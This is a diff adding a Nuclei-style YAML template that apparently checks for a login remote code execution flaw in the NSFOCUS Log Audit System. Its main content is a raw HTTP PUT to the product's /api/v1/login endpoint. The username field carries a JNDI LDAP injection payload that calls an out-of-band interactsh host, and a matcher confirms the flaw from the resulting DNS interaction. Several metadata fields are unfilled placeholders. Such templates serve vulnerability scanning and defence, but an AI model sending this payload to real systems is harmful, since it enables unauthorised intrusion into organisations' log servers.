@@ -1,0 +1,32 @@
+id: nsfocus-LAS-login-rce
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 绿盟日志审计系统（NSFOCUS Log Audit System，简称NSFOCUS LAS）是基于大数据架构的综合日志管理平台，通过大数据技术的海量日志采集、异构设备日志范式化及安全事件关联分析，实现日志全生命周期管理。协助运维人员从事前（发现安全风险）、事中（分析溯源）及事后（调查取证）等多个维度监控网络安全事件，助力企业满足《网络安全法》及等保合规要求。
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        PUT /api/v1/login HTTP/1.1
+        Host: {{Hostname}}
+        Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
+        Sec-Ch-Ua-Mobile: ?1
+        Sec-Ch-Ua-Platform: "iOS"
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/126.0.6478.54 Mobile/15E148 Safari/604.1
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Cookie: JSESSIONID=C2CBDF46F7B53365D2ECE60AA645B673; sessionid=w0gr7fyrkt56tf6yc3sr0pw6mjl59txi
+        Content-Type: application/json;charset=UTF-8
+        Connection: close
+
+        {"name":"${jndi:ldap://{{interactsh-url}}}","password":"2Y4W5F5h"}
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
